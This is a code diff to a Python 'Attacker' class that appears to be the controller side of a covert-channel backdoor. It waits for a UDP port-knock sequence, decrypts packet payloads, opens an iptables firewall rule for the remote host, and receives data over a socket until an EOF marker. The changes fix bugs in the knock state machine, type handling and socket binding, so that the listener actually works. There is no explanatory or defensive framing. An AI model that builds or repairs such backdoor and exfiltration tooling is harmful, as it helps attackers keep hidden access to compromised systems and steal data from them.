@@ -32,9 +32,9 @@ class Attacker(object):
 
         self.knockList = []
         for port in kList.split(','):
-            self.knockList.append(port)
+            self.knockList.append(int(port))
 
-        self.ttl = ttl
+        self.ttl = int(ttl)
         self.state = 0
 
     def run(self):
@@ -85,7 +85,6 @@ class Attacker(object):
         """
         """
         payload = packet[self.protocol].payload.load
-        print(encryption.decrypt(payload))
         data = helpers.decode(encryption.decrypt(payload))
         if data == "":
             return
@@ -106,20 +105,23 @@ class Attacker(object):
         return packet[Ether].src != hardwareAddr
 
     def knockListener(self):
-        mFilter = "udp and src host " + self.remoteIP + " and dst host " + self.localIP
-        sniff(filter=mFilter, prn=self.knockReceive)
+        mFilter = "udp and src host " + self.remoteIP + " and src port " + str(self.remotePort)
+        while self.state != 3:
+            sniff(filter=mFilter, prn=self.knockReceive, count=1)
+        self.state = 0
 
     def knockReceive(self, packet):
         if packet.haslayer(UDP):
+            print(self.knockList)
             port = packet[UDP].dport
             if port == self.knockList[0] and self.state == 0:
-                self.state == 1
+                self.state = 1
                 print("Knock %d" % self.state)
             elif port == self.knockList[1] and self.state == 1:
-                self.state == 2
+                self.state = 2
                 print("Knock %d" % self.state)
             elif port == self.knockList[2] and self.state == 2:
-                self.state == 3
+                self.state = 3
                 print("Knock %d...Openning port for receiving" % self.state)
                 self.acceptRequest()
             else:
@@ -127,15 +129,17 @@ class Attacker(object):
                 self.state = 0
 
     def acceptRequest(self):
-        iptablesManager.openPort(self.protocol, self.remoteIP, str(self.listenPort), self.ttl)
+        iptablesManager.run(self.protocol, self.remoteIP, str(self.listenPort), self.ttl)
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        sock.bind(("", self.listenPort))
+        hostIP = socket.gethostbyname(socket.gethostname())
+
+        sock.bind((hostIP, self.listenPort))
 
         sock.listen(1)
-        print("Ready to receive...")
+        print("Ready to receive on port %d..." % self.listenPort)
         conn, addr = sock.accept()
         print("Receive connection from {}".format(addr))
 
@@ -144,7 +148,7 @@ class Attacker(object):
             while True:
                 data = conn.recv(BUFSIZE)
 
-                if data.endswith("EOF"):
+                if data.endswith(b"EOF"):
                     data = data[:-3]
                     receivedData.write(data)
                     break
